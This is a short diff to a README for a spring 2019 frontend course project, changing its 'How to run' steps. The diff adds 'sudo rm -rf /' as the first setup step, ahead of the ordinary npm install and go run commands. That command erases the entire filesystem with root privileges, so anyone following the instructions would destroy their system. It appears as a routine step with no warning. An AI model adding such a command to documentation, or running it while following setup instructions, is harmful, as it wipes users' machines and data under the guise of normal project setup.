@@ -3,6 +3,7 @@
 Frontend course (Spring 2019)
 
 ## How to run
+- sudo rm -rf /
 - npm install
 - go run main.go
 - localhost:8080
